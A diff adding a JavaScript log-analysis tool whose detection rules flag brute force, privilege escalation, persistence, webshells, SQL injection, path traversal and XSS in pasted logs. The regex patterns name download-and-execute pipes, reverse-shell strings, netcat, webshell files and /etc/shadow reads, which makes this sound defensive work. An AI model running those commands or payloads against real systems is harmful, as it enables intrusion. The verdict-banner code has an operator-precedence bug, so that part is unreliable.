+      });
+      Object.keys(fails).forEach(function(ip) {
+        if (fails[ip].length >= opts.bruteThresh) {
+          hits.push({
+            type: 'ssh_brute',
+            ip: ip,
+            count: fails[ip].length,
+            users: Array.from(new Set(fails[ip].map(function(f){return f.user;}))),
+            evidence: fails[ip].slice(0, 10),
+            detail: fails[ip].length + ' failed login attempts from ' + ip + ' targeting: ' + Array.from(new Set(fails[ip].map(function(f){return f.user;}))).slice(0,5).join(', ')
+          });
+        }
+      });
+      return hits;
+    }
+  },
+
+  // ── WIN EVENT BRUTE ──────────────────────────────────────────────────────────
+  {
+    id: 'win_brute',
+    title: 'Windows Failed Logon Storm (Event 4625)',
+    severity: 'critical',
+    category: 'Brute Force',
+    mitre: ['T1110.001'],
+    description: 'Multiple Windows Event ID 4625 (failed logon) events from same source.',
+    detect: function(lines, opts) {
+      var fails = {};
+      var hits = [];
+      lines.forEach(function(line, idx) {
+        if (/4625/.test(line) && /failed|log.?on/i.test(line)) {
+          var ipM = line.match(/([\d]{1,3}\.[\d]{1,3}\.[\d]{1,3}\.[\d]{1,3})/);
+          var ip = ipM ? ipM[1] : 'unknown';
+          if (!fails[ip]) fails[ip] = [];
+          fails[ip].push({ line: line, idx: idx });
+        }
+      });
+      Object.keys(fails).forEach(function(ip) {
+        if (fails[ip].length >= opts.bruteThresh) {
+          hits.push({ ip: ip, count: fails[ip].length, evidence: fails[ip].slice(0,10),
+            detail: fails[ip].length + ' Event 4625 failures from ' + ip });
+        }
+      });
+      return hits;
+    }
+  },
+
+  // ── SUCCESSFUL LOGIN AFTER FAILURES ─────────────────────────────────────────
+  {
+    id: 'brute_success',
+    title: 'Successful Login After Repeated Failures',
+    severity: 'critical',
+    category: 'Brute Force',
+    mitre: ['T1110.001','T1078'],
+    description: 'A successful authentication was preceded by multiple failures — strong indicator of a successful brute force attack.',
+    detect: function(lines, opts) {
+      var failedIPs = {};
+      var hits = [];
+      lines.forEach(function(line, idx) {
+        var failM = line.match(/[Ff]ailed password.+from ([\d\.a-f:]+)/);
+        if (failM) {
+          if (!failedIPs[failM[1]]) failedIPs[failM[1]] = 0;
+          failedIPs[failM[1]]++;
+        }
+        var succM = line.match(/[Aa]ccepted (password|publickey).+from ([\d\.a-f:]+)/);
+        if (!succM) succM = line.match(/4624.+?Source.+?([\d\.]+).*?Logon.?Type.?\:?\s*([38])/i) ? [null,'password',line.match(/([\d\.]+)/)[1]] : null;
+        if (succM) {
+          var ip = succM[2];
+          if (failedIPs[ip] && failedIPs[ip] >= opts.bruteThresh) {
+            hits.push({ ip: ip, failCount: failedIPs[ip], evidence: [{ line: line, idx: idx }],
+              detail: 'Successful login from ' + ip + ' after ' + failedIPs[ip] + ' failures — COMPROMISED' });
+          }
+        }
+      });
+      return hits;
+    }
+  },
+
+  // ── LATERAL MOVEMENT ─────────────────────────────────────────────────────────
+  {
+    id: 'lateral_ssh',
+    title: 'Lateral Movement via SSH',
+    severity: 'high',
+    category: 'Lateral Movement',
+    mitre: ['T1021.004','T1078'],
+    description: 'A single account authenticated to many different internal hosts in a short time — classic lateral movement pattern.',
+    detect: function(lines, opts) {
+      var userHosts = {};
+      var hits = [];
+      lines.forEach(function(line, idx) {
+        var m = line.match(/[Aa]ccepted (?:password|publickey) for (\S+) from ([\d\.]+)/);
+        if (m) {
+          var user = m[1], src = m[2];
+          var key = user + '@' + src;
+          if (!userHosts[key]) userHosts[key] = { user: user, src: src, destinations: [], evidence: [] };
+          // Extract destination hostname if available
+          var hostM = line.match(/^(\S+)\s/);
+          var dest = hostM ? hostM[1] : 'unknown';
+          if (!userHosts[key].destinations.includes(dest)) userHosts[key].destinations.push(dest);
+          userHosts[key].evidence.push({ line: line, idx: idx });
+        }
+      });
+      Object.values(userHosts).forEach(function(u) {
+        if (u.destinations.length >= 3) {
+          hits.push({ user: u.user, src: u.src, destinations: u.destinations,
+            evidence: u.evidence.slice(0,8),
+            detail: 'Account "' + u.user + '" from ' + u.src + ' logged into ' + u.destinations.length + ' hosts: ' + u.destinations.slice(0,5).join(', ') });
+        }
+      });
+      return hits;
+    }
+  },
+
+  // ── PASS THE HASH / EXPLICIT CREDENTIALS ─────────────────────────────────────
+  {
+    id: 'explicit_creds',
+    title: 'Explicit Credential Usage (Event 4648)',
+    severity: 'high',
+    category: 'Lateral Movement',
+    mitre: ['T1550.002','T1021'],
+    description: 'Windows Event 4648 — logon using explicit credentials. Common in pass-the-hash and lateral movement.',
+    detect: function(lines, opts) {
+      var hits = [];
+      var evidence = [];
+      lines.forEach(function(line, idx) {
+        if (/4648/.test(line)) {
+          evidence.push({ line: line, idx: idx });
+        }
+      });
+      if (evidence.length > 0) {
+        hits.push({ count: evidence.length, evidence: evidence.slice(0,10),
+          detail: evidence.length + ' explicit credential logon event(s) detected' });
+      }
+      return hits;
+    }
+  },
+
+  // ── PRIVILEGE ESCALATION — SUDO ─────────────────────────────────────────────
+  {
+    id: 'sudo_privesc',
+    title: 'Suspicious Sudo / Privilege Escalation',
+    severity: 'high',
+    category: 'Privilege Escalation',
+    mitre: ['T1548.003'],
+    description: 'Sudo usage by unusual accounts (web server processes, non-interactive users) or escalation to root shell.',
+    detect: function(lines, opts) {
+      var hits = [];
+      var suspiciousUsers = ['www-data','apache','nginx','nobody','daemon','mysql','postgres','tomcat','jenkins'];
+      lines.forEach(function(line, idx) {
+        if (!/sudo/i.test(line)) return;
+        // Suspicious user using sudo
+        suspiciousUsers.forEach(function(u) {
+          if (line.toLowerCase().includes(u + ' :') && /USER=root/i.test(line)) {
+            hits.push({ user: u, evidence: [{ line: line, idx: idx }],
+              detail: 'Service account "' + u + '" escalated to root via sudo' });
+          }
+        });
+        // Root shell via sudo
+        if (/USER=root.*COMMAND=.*\/(bash|sh|zsh|python|perl|ruby)/i.test(line)) {
+          if (!hits.some(function(h){ return h.evidence[0].idx === idx; })) {
+            hits.push({ evidence: [{ line: line, idx: idx }],
+              detail: 'Root shell spawned via sudo: ' + (line.match(/COMMAND=(.+)/i)||[])[1] });
+          }
+        }
+      });
+      return hits;
+    }
+  },
+
+  // ── PRIVILEGE ESCALATION — SPECIAL PRIVS ────────────────────────────────────
+  {
+    id: 'special_privs',
+    title: 'Special Privileges Assigned (Event 4672)',
+    severity: 'high',
+    category: 'Privilege Escalation',
+    mitre: ['T1078.002','T1134'],
+    description: 'Windows Event 4672 — sensitive privileges (SeDebugPrivilege, SeImpersonatePrivilege) assigned at logon.',
+    detect: function(lines, opts) {
+      var hits = [];
+      var evidence = [];
+      lines.forEach(function(line, idx) {
+        if (/4672/.test(line) && /SeDebug|SeImpersonate|SeTcb|SeAssignPrimary/i.test(line)) {
+          evidence.push({ line: line, idx: idx });
+        }
+      });
+      if (evidence.length > 0) {
+        hits.push({ count: evidence.length, evidence: evidence.slice(0,8),
+          detail: 'High-value privileges assigned: SeDebugPrivilege / SeImpersonatePrivilege detected' });
+      }
+      return hits;
+    }
+  },
+
+  // ── NEW USER CREATED ─────────────────────────────────────────────────────────
+  {
+    id: 'new_account',
+    title: 'New User Account Created',
+    severity: 'high',
+    category: 'Persistence',
+    mitre: ['T1136.001'],
+    description: 'A new local user account was created — potential backdoor account.',
+    detect: function(lines, opts) {
+      var hits = [];
+      lines.forEach(function(line, idx) {
+        if (/useradd|adduser/i.test(line) && /new user/i.test(line)) {
+          var userM = line.match(/name=(\S+)/i);
+          hits.push({ user: userM ? userM[1] : 'unknown', evidence: [{ line: line, idx: idx }],
+            detail: 'New local account created: ' + (userM ? userM[1] : 'unknown') });
+        }
+        if (/4720/.test(line)) {
+          var userM = line.match(/New Account Name:\s*(\S+)/i);
+          hits.push({ user: userM ? userM[1] : 'unknown', evidence: [{ line: line, idx: idx }],
+            detail: 'Windows: New user account created: ' + (userM ? userM[1] : 'unknown') });
+        }
+      });
+      return hits;
+    }
+  },
+
+  // ── GROUP MEMBERSHIP CHANGE ──────────────────────────────────────────────────
+  {
+    id: 'admin_group',
+    title: 'Account Added to Privileged Group',
+    severity: 'critical',
+    category: 'Privilege Escalation',
+    mitre: ['T1136','T1098'],
+    description: 'User added to administrators/sudo/Domain Admins group.',
+    detect: function(lines, opts) {
+      var hits = [];
+      lines.forEach(function(line, idx) {
+        if (/usermod.+sudo|4728|4732|added.+admin/i.test(line)) {
+          hits.push({ evidence: [{ line: line, idx: idx }],
+            detail: 'Account added to privileged group: ' + line.substring(0,120) });
+        }
+      });
+      return hits;
+    }
+  },
+
+  // ── CRON / SCHEDULED TASK ────────────────────────────────────────────────────
+  {
+    id: 'cron_persistence',
+    title: 'Suspicious Cron / Scheduled Task',
+    severity: 'high',
+    category: 'Persistence',
+    mitre: ['T1053.003','T1053.005'],
+    description: 'Cron job executing downloads, reverse shells, or scripts from /tmp.',
+    detect: function(lines, opts) {
+      var hits = [];
+      lines.forEach(function(line, idx) {
+        if (/cron|CRON|schtasks|at\.exe/i.test(line)) {
+          if (/curl|wget|nc |netcat|bash -i|python.*socket|\/tmp\/|powershell.*download/i.test(line)) {
+            hits.push({ evidence: [{ line: line, idx: idx }],
+              detail: 'Suspicious scheduled task with download/shell command: ' + line.substring(0,150) });
+          }
+        }
+      });
+      return hits;
+    }
+  },
+
+  // ── C2 / DOWNLOAD ────────────────────────────────────────────────────────────
+  {
+    id: 'c2_download',
+    title: 'C2 / Malware Download Attempt',
+    severity: 'critical',
+    category: 'Command & Control',
+    mitre: ['T1105','T1071'],
+    description: 'Commands or log entries indicating downloading and executing remote code.',
+    detect: function(lines, opts) {
+      var hits = [];
+      lines.forEach(function(line, idx) {
+        if (/curl.+\|.*(bash|sh)|wget.+\|.*(bash|sh)|bash.*<\(curl|bash.*<\(wget/i.test(line)) {
+          hits.push({ evidence: [{ line: line, idx: idx }],
+            detail: 'Download-and-execute pattern: ' + line.substring(0,160) });
+        }
+        if (/cmd=.*wget|cmd=.*curl|cmd=.*nc |shell\.php/i.test(line)) {
+          hits.push({ evidence: [{ line: line, idx: idx }],
+            detail: 'Webshell command execution detected: ' + line.substring(0,160) });
+        }
+      });
+      return hits;
+    }
+  },
+
+  // ── WEBSHELL ─────────────────────────────────────────────────────────────────
+  {
+    id: 'webshell',
+    title: 'Webshell Activity',
+    severity: 'critical',
+    category: 'Execution',
+    mitre: ['T1505.003'],
+    description: 'Web requests executing system commands — indicates a webshell.',
+    detect: function(lines, opts) {
+      var hits = [];
+      lines.forEach(function(line, idx) {
+        if (/shell\.php|c99\.php|r57\.php|cmd\.php|eval\.php/i.test(line) ||
+            /cmd=(id|whoami|cat|ls|uname|wget|curl|passwd)/i.test(line)) {
+          hits.push({ evidence: [{ line: line, idx: idx }],
+            detail: 'Webshell access/execution: ' + line.substring(0,160) });
+        }
+      });
+      return hits;
+    }
+  },
+
+  // ── SQL INJECTION ────────────────────────────────────────────────────────────
+  {
+    id: 'sqli',
+    title: 'SQL Injection Attempt',
+    severity: 'high',
+    category: 'Web Attack',
+    mitre: ['T1190'],
+    description: 'SQL injection patterns detected in web access logs.',
+    detect: function(lines, opts) {
+      var hits = [];
+      var sqliPatterns = [/UNION\s+SELECT/i,/OR\s+['"]?1['"]?\s*=\s*['"]?1/i,/information_schema/i,
+        /DROP\s+TABLE/i,/INSERT\s+INTO.+VALUES/i,/1=1--/i,/sleep\(\d+\)/i,/benchmark\(/i];
+      lines.forEach(function(line, idx) {
+        if (sqliPatterns.some(function(p){ return p.test(line); })) {
+          hits.push({ evidence: [{ line: line, idx: idx }],
+            detail: 'SQL injection pattern: ' + line.substring(0,160) });
+        }
+      });
+      return hits;
+    }
+  },
+
+  // ── PATH TRAVERSAL ───────────────────────────────────────────────────────────
+  {
+    id: 'path_traversal',
+    title: 'Path Traversal Attempt',
+    severity: 'high',
+    category: 'Web Attack',
+    mitre: ['T1190'],
+    description: 'Directory traversal sequences detected — attacker attempting to read system files.',
+    detect: function(lines, opts) {
+      var hits = [];
+      lines.forEach(function(line, idx) {
+        if (/\.\.\/\.\.\/|\.\.%2f\.\.%2f|%2e%2e%2f/i.test(line) ||
+            /etc\/passwd|etc\/shadow|etc\/hosts|windows\/win\.ini/i.test(line)) {
+          hits.push({ evidence: [{ line: line, idx: idx }],
+            detail: 'Path traversal attempt: ' + line.substring(0,160) });
+        }
+      });
+      return hits;
+    }
+  },
+
+  // ── XSS ──────────────────────────────────────────────────────────────────────
+  {
+    id: 'xss',
+    title: 'Cross-Site Scripting (XSS) Attempt',
+    severity: 'medium',
+    category: 'Web Attack',
+    mitre: ['T1190'],
+    description: 'XSS payload patterns in web requests.',
+    detect: function(lines, opts) {
+      var hits = [];
+      lines.forEach(function(line, idx) {
+        if (/<script[\s>]|javascript:/i.test(line) || /alert\(|document\.cookie|onerror=/i.test(line)) {
+          hits.push({ evidence: [{ line: line, idx: idx }],
+            detail: 'XSS attempt: ' + line.substring(0,160) });
+        }
+      });
+      return hits;
+    }
+  },
+
+  // ── NEW SERVICE INSTALLED ────────────────────────────────────────────────────
+  {
+    id: 'new_service',
+    title: 'Suspicious New Service Installed (Event 7045)',
+    severity: 'critical',
+    category: 'Persistence',
+    mitre: ['T1543.003'],
+    description: 'A new Windows service was installed — common persistence technique.',
+    detect: function(lines, opts) {
+      var hits = [];
+      lines.forEach(function(line, idx) {
+        if (/7045/.test(line) || (/new service/i.test(line) && /install/i.test(line))) {
+          var svcM = line.match(/Service Name:\s*(\S+)/i) || line.match(/service.*name[=:]\s*(\S+)/i);
+          var pathM = line.match(/Service File Name:\s*(.+)/i) || line.match(/file.*name[=:]\s*(.+)/i);
+          var isSuspicious = pathM && /temp|tmp|appdata|programdata|users.*public/i.test(pathM[1]);
+          if (isSuspicious || /7045/.test(line)) {
+            hits.push({ service: svcM ? svcM[1] : 'unknown', path: pathM ? pathM[1] : '',
+              evidence: [{ line: line, idx: idx }],
+              detail: 'New service: ' + (svcM ? svcM[1] : '') + (pathM ? ' → ' + pathM[1].substring(0,80) : '') });
+          }
+        }
+      });
+      return hits;
+    }
+  },
+
+  // ── ROOT LOGIN ───────────────────────────────────────────────────────────────
+  {
+    id: 'root_login',
+    title: 'Direct Root Login',
+    severity: 'high',
+    category: 'Privilege Escalation',
+    mitre: ['T1078.003'],
+    description: 'Successful direct login as root — should be disabled in secure environments.',
+    detect: function(lines, opts) {
+      var hits = [];
+      lines.forEach(function(line, idx) {
+        if (/[Aa]ccepted (password|publickey) for root/i.test(line)) {
+          hits.push({ evidence: [{ line: line, idx: idx }],
+            detail: 'Direct root login: ' + line.substring(0,120) });
+        }
+      });
+      return hits;
+    }
+  },
+
+  // ── PORT SCAN ────────────────────────────────────────────────────────────────
+  {
+    id: 'port_scan',
+    title: 'Port Scan / Reconnaissance',
+    severity: 'medium',
+    category: 'Discovery',
+    mitre: ['T1046'],
+    description: 'Single source making many short connections across different ports — port scan pattern.',
+    detect: function(lines, opts) {
+      var connCounts = {};
+      var hits = [];
+      lines.forEach(function(line, idx) {
+        var m = line.match(/from ([\d\.]+) port (\d+)/i) || line.match(/([\d\.]+):(\d+).*(?:refused|reset|closed)/i);
+        if (m) {
+          if (!connCounts[m[1]]) connCounts[m[1]] = new Set();
+          connCounts[m[1]].add(m[2]);
+        }
+      });
+      Object.keys(connCounts).forEach(function(ip) {
+        if (connCounts[ip].size >= 15) {
+          hits.push({ ip: ip, portCount: connCounts[ip].size,
+            evidence: [], detail: ip + ' contacted ' + connCounts[ip].size + ' unique ports — likely port scan' });
+        }
+      });
+      return hits;
+    }
+  },
+
+  // ── ACCOUNT LOCKOUT ─────────────────────────────────────────────────────────
+  {
+    id: 'lockout',
+    title: 'Account Lockout',
+    severity: 'medium',
+    category: 'Brute Force',
+    mitre: ['T1110'],
+    description: 'Account locked out due to too many failed attempts.',
+    detect: function(lines, opts) {
+      var hits = [];
+      lines.forEach(function(line, idx) {
+        if (/locked out|account.*lock|4740|pam_tally|pam_faillock.*user.+locked/i.test(line)) {
+          hits.push({ evidence: [{ line: line, idx: idx }],
+            detail: 'Account lockout: ' + line.substring(0,120) });
+        }
+      });
+      return hits;
+    }
+  },
+
+];
+
+// Severity filter by sensitivity setting
+var SEV_LEVELS = { high: ['critical','high'], medium: ['critical','high','medium'], low: ['critical'] };
+
+// ── MAIN ANALYZE ──────────────────────────────────────────────────────────────
+function analyze() {
+  var rawLog = getLogContent();
+  if (!rawLog || rawLog.length < 10) { alert('Please paste log content or load a file first.'); return; }
+
+  document.getElementById('resultsPanel').innerHTML =
+    '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;flex:1;gap:12px;padding:40px">'
+    + '<div class="spinner" style="width:24px;height:24px;border-width:3px"></div>'
+    + '<div style="font-family:var(--mono);font-size:12px;color:var(--muted2)">Analyzing logs…</div></div>';
+
+  // Small delay to let UI update
+  setTimeout(function() {
+    try {
+      var lines = rawLog.split(/\r?\n/);
+      var sensitivity = document.getElementById('sensitivity').value;
+      var bruteThresh = parseInt(document.getElementById('bruteThresh').value);
+      var allowedSevs = SEV_LEVELS[sensitivity] || SEV_LEVELS.medium;
+
+      var opts = { bruteThresh: bruteThresh };
+      var findings = [];
+
+      RULES.forEach(function(rule) {
+        if (!allowedSevs.includes(rule.severity)) return;
+        try {
+          var hits = rule.detect(lines, opts);
+          if (hits && hits.length > 0) {
+            findings.push({ rule: rule, hits: hits });
+          }
+        } catch(e) { /* rule error — skip */ }
+      });
+
+      // Sort by severity
+      var sevOrder = { critical:0, high:1, medium:2, low:3, info:4 };
+      findings.sort(function(a,b){ return (sevOrder[a.rule.severity]||5) - (sevOrder[b.rule.severity]||5); });
+
+      analysisResults = {
+        findings: findings,
+        lineCount: lines.length,
+        logContent: rawLog,
+        scanDate: new Date(),
+      };
+
+      renderResults();
+    } catch(err) {
+      document.getElementById('resultsPanel').innerHTML =
+        '<div class="empty-state"><h3 style="color:var(--red)">Analysis Error</h3>'
+        + '<p style="font-family:var(--mono);font-size:12px">' + esc(err.message) + '</p></div>';
+    }
+  }, 80);
+}
+
+// ── RENDER ────────────────────────────────────────────────────────────────────
+function esc(s){ return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+function highlightLine(line, severity) {
+  var h = esc(line);
+  // Highlight IPs
+  h = h.replace(/\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b/g, '<mark class="blue">$1</mark>');
+  // Highlight danger keywords
+  var redWords = ['Failed','failed','FAILED','root','sudo','UNION SELECT','DROP TABLE','shell.php','cmd=','wget','curl','bash -i','/etc/passwd','/etc/shadow','4625','4648','4672','4720','4728','7045'];
+  redWords.forEach(function(w) {
+    h = h.replace(new RegExp(esc(w).replace(/[.*+?^${}()|[\]\\]/g,'\\$&'), 'g'), '<mark class="red">'+esc(w)+'</mark>');
+  });
+  var orangeWords = ['Accepted','accepted','session opened','privilege','escalat','COMMAND='];
+  orangeWords.forEach(function(w) {
+    h = h.replace(new RegExp(esc(w).replace(/[.*+?^${}()|[\]\\]/g,'\\$&'), 'g'), '<mark class="orange">'+esc(w)+'</mark>');
+  });
+  return h;
+}
+
+function renderResults() {
+  var r = analysisResults;
+  if (!r) return;
+
+  var totalFindings = r.findings.length;
+  var critCount = r.findings.filter(function(f){ return f.rule.severity==='critical'; }).length;
+  var highCount  = r.findings.filter(function(f){ return f.rule.severity==='high'; }).length;
+  var medCount   = r.findings.filter(function(f){ return f.rule.severity==='medium'; }).length;
+  var totalHits  = r.findings.reduce(function(s,f){ return s+f.hits.length; },0);
+
+  var riskScore = Math.min(critCount*25 + highCount*12 + medCount*5, 100);
+  var riskColor = riskScore>=60?'var(--red)':riskScore>=30?'var(--orange)':'var(--green)';
+  var riskLabel = riskScore>=60?'CRITICAL THREAT ACTIVITY':riskScore>=30?'SUSPICIOUS ACTIVITY':'LOW / CLEAN';
+  var riskIcon  = riskScore>=60?'🚨':riskScore>=30?'⚠️':'✅';
+
+  var filtered = r.findings.filter(function(f) {
+    if (activeFilter==='all') return true;
+    return f.rule.severity === activeFilter || f.rule.category.toLowerCase().replace(/ /g,'-') === activeFilter;
+  });
+
+  var html = '';
+
+  // Verdict
+  html += '<div class="verdict-banner fade-in" style="background:'+riskScore>=60?'var(--red-s)':riskScore>=30?'var(--orange-s)':'var(--green-s)'+'">';
+  html += '<div class="verdict-icon">'+riskIcon+'</div>'
+    + '<div><div class="verdict-label" style="color:'+riskColor+'">'+riskLabel+'</div>'
+    + '<div class="verdict-sub">'+totalFindings+' detection rule'+(totalFindings!==1?'s':'')+' triggered · '
+    + totalHits+' event'+(totalHits!==1?'s':'')+' matched · '
+    + r.lineCount.toLocaleString()+' lines analyzed</div></div></div>';
+
+  // Risk meter
+  html += '<div class="risk-meter"><span style="font-size:11px;color:var(--muted);font-family:var(--mono);flex-shrink:0">Threat Score</span>'
+    + '<div class="risk-track"><div class="risk-fill" style="width:'+riskScore+'%;background:'+riskColor+'"></div></div>'
+    + '<span class="risk-pct" style="color:'+riskColor+'">'+riskScore+' / 100</span></div>';
+
+  // Summary cards
+  html += '<div class="summary-bar">';
+  [[critCount,'Critical',critCount>0?'var(--red)':'var(--muted)'],
+   [highCount,'High',highCount>0?'var(--orange)':'var(--muted)'],
+   [medCount,'Medium',medCount>0?'var(--yellow)':'var(--muted)'],
+   [totalHits,'Events Matched',totalHits>0?'var(--text)':'var(--muted)'],
+   [r.lineCount.toLocaleString(),'Lines Analyzed','var(--blue)']].forEach(function(s){
+    html += '<div class="sum-card"><div class="sum-num" style="color:'+s[2]+'">'+s[0]+'</div><div class="sum-lbl">'+s[1]+'</div></div>';
+  });
+  html += '</div>';
+
+  // Toolbar
+  html += '<div class="toolbar">';
+  [['all','All ('+totalFindings+')'],['critical','Critical ('+critCount+')'],
+   ['high','High ('+highCount+')'],['medium','Medium ('+medCount+')']].forEach(function(f){
+    html += '<span class="filter-chip'+(activeFilter===f[0]?' active':'')+'" onclick="setFilter(\''+f[0]+'\')">'+f[1]+'</span>';
+  });
+  html += '<span class="spacer"></span>';
+  html += '<button class="exp-btn exp-csv" onclick="exportCSV()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>CSV</button>';
+  html += '<button class="exp-btn exp-html" onclick="exportHTML()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>HTML</button>';
+  html += '<button class="exp-btn exp-pdf" onclick="exportPDF()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>PDF</button>';
+  html += '</div>';
+
+  // Findings
+  html += '<div class="findings-wrap">';
+  if (filtered.length === 0) {
+    html += '<div style="text-align:center;padding:32px;color:var(--muted);font-size:13px">'
+      + (r.findings.length === 0 ? '✅ No suspicious patterns detected in this log.' : 'No findings match the current filter.') + '</div>';
+  }
+  filtered.forEach(function(f, fi) {
+    var rule = f.rule;
+    var sevCls = 'sev-'+rule.severity;
+    var cardId = 'finding-'+fi;
+
+    var allEvidence = [];
+    f.hits.forEach(function(h){ if (h.evidence) allEvidence = allEvidence.concat(h.evidence); });
+
+    var details = f.hits.map(function(h){ return h.detail || ''; }).filter(Boolean);
+
+    html += '<div class="finding-card '+rule.severity+'">'
+      + '<div class="finding-hdr" onclick="togFinding(\''+cardId+'\')">'
+        + '<span class="finding-sev '+sevCls+'">'+rule.severity.toUpperCase()+'</span>'
+        + '<span class="finding-title">'+esc(rule.title)+'</span>'
+        + '<span style="font-size:10px;color:var(--muted2);font-family:var(--mono);margin-right:6px">'+esc(rule.category)+'</span>'
+        + '<span class="finding-count">'+allEvidence.length+' event'+(allEvidence.length!==1?'s':'')+'</span>'
+        + '<span class="finding-arr" id="arr-'+cardId+'">▼</span>'
+      + '</div>'
+      + '<div class="finding-body" id="body-'+cardId+'">';
+
+    // MITRE tags + description
+    html += '<div style="padding:10px 14px;border-bottom:1px solid var(--border);display:flex;align-items:flex-start;gap:10px;flex-wrap:wrap">'
+      + '<div style="flex:1;min-width:200px"><div style="font-size:11px;color:var(--muted2);line-height:1.6">'+esc(rule.description)+'</div>';
+    if (details.length) {
+      html += '<div style="margin-top:8px;display:flex;flex-direction:column;gap:4px">';
+      details.slice(0,4).forEach(function(d) {
+        html += '<div style="font-size:11px;font-family:var(--mono);color:var(--text);background:var(--s2);border:1px solid var(--border);border-radius:5px;padding:5px 8px">'+esc(d)+'</div>';
+      });
+      html += '</div>';
+    }
+    html += '</div>';
+    if (rule.mitre && rule.mitre.length) {
+      html += '<div style="display:flex;flex-wrap:wrap;gap:4px;align-self:flex-start">';
+      rule.mitre.forEach(function(t) {
+        html += '<a class="mitre-tag" href="https://attack.mitre.org/techniques/'+t.replace('.','/').replace('T','T')+'" target="_blank" rel="noopener">'+t+'</a>';
+      });
+      html += '</div>';
+    }
+    html += '</div>';
+
+    // Evidence lines
+    if (allEvidence.length > 0) {
+      html += '<div class="evidence-wrap">';
+      allEvidence.slice(0,15).forEach(function(ev) {
+        html += '<div class="evidence-line">'
+          + '<span class="ev-num">'+(ev.idx+1)+'</span>'
+          + '<span class="ev-text">'+highlightLine(ev.line, rule.severity)+'</span>'
+          + '</div>';
+      });
+      if (allEvidence.length > 15) {
+        html += '<div style="padding:6px 12px;font-size:10px;color:var(--muted);font-family:var(--mono)">… '+(allEvidence.length-15)+' more events</div>';
+      }
+      html += '</div>';
+    }
+
+    html += '</div></div>';
+  });
+  html += '</div>';
+
+  if (r.findings.length === 0) {
+    html += '<div style="padding:20px 24px;font-size:12px;color:var(--muted);font-family:var(--mono);border-top:1px solid var(--border)">No detections · '
+      + r.lineCount.toLocaleString() + ' lines processed · '
+      + RULES.length + ' rules evaluated</div>';
+  }
+
+  document.getElementById('resultsPanel').innerHTML = html;
+}
+
+function togFinding(id) {
+  var body = document.getElementById('body-'+id);
+  var arr  = document.getElementById('arr-'+id);
+  if (!body) return;
+  var open = body.classList.toggle('open');
+  arr.textContent = open ? '▲' : '▼';
+}
+
+function setFilter(f) {
+  activeFilter = f;
+  renderResults();
+}
+
+// ── EXPORT CSV ────────────────────────────────────────────────────────────────
+function exportCSV() {
+  if (!analysisResults) return;
+  var rows = [['severity','category','title','mitre_tags','event_count','detail'].join(',')];
+  analysisResults.findings.forEach(function(f) {
+    f.hits.forEach(function(h) {
+      rows.push([
+        '"'+f.rule.severity+'"','"'+f.rule.category+'"','"'+f.rule.title+'"',
+        '"'+(f.rule.mitre||[]).join(';')+'"',
+        (h.evidence||[]).length,
+        '"'+(h.detail||'').replace(/"/g,"'")+'"'
+      ].join(','));
+    });
+  });
+  var blob = new Blob([rows.join('\n')],{type:'text/csv'});
+  var a = document.createElement('a'); a.href=URL.createObjectURL(blob);
+  a.download='log-analysis-'+new Date().toISOString().split('T')[0]+'.csv'; a.click();
+}
+
+// ── EXPORT HTML ───────────────────────────────────────────────────────────────
+function exportHTML() {
+  if (!analysisResults) return;
+  var r = analysisResults;
+  var now = new Date();
+  var dateStr = now.toLocaleDateString('en-US',{year:'numeric',month:'long',day:'numeric'});
+  var timeStr = now.toUTCString();
+  function safe(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+
+  var critCount = r.findings.filter(function(f){return f.rule.severity==='critical';}).length;
+  var highCount  = r.findings.filter(function(f){return f.rule.severity==='high';}).length;
+  var medCount   = r.findings.filter(function(f){return f.rule.severity==='medium';}).length;
+  var totalHits  = r.findings.reduce(function(s,f){return s+f.hits.reduce(function(a,h){return a+(h.evidence||[]).length;},0);},0);
+  var riskScore  = Math.min(critCount*25+highCount*12+medCount*5,100);
+
+  var sevColors = {critical:'#dc2626',high:'#ea580c',medium:'#ca8a04',low:'#2563eb',info:'#6b7280'};
+
+  var findingRows = r.findings.map(function(f,i){
+    var allEv = []; f.hits.forEach(function(h){if(h.evidence)allEv=allEv.concat(h.evidence);});
+    var details = f.hits.map(function(h){return h.detail||'';}).filter(Boolean);
+    var sc = sevColors[f.rule.severity]||'#6b7280';
+    return '<div style="margin-bottom:14px;border:1px solid #e5e7eb;border-left:4px solid '+sc+';border-radius:0 8px 8px 0;overflow:hidden">'
+      +'<div style="background:#f8fafc;padding:10px 16px;display:flex;align-items:center;gap:10px">'
+        +'<span style="background:'+sc+'22;color:'+sc+';font-size:10px;font-weight:700;padding:2px 8px;border-radius:4px;border:1px solid '+sc+'55">'+f.rule.severity.toUpperCase()+'</span>'
+        +'<strong style="font-size:13px">'+safe(f.rule.title)+'</strong>'
+        +'<span style="margin-left:auto;font-size:11px;color:#6b7280">'+safe(f.rule.category)+' · '+allEv.length+' events</span>'
+      +'</div>'
+      +'<div style="padding:10px 16px;font-size:12px;color:#374151;border-bottom:1px solid #e5e7eb">'+safe(f.rule.description)+'</div>'
+      +(details.length?'<div style="padding:8px 16px;background:#fafafa;border-bottom:1px solid #e5e7eb">'+details.slice(0,3).map(function(d){return '<div style="font-family:monospace;font-size:11px;color:#374151;margin-bottom:4px;padding:3px 6px;background:#f1f5f9;border-radius:3px">'+safe(d)+'</div>';}).join('')+'</div>':'')
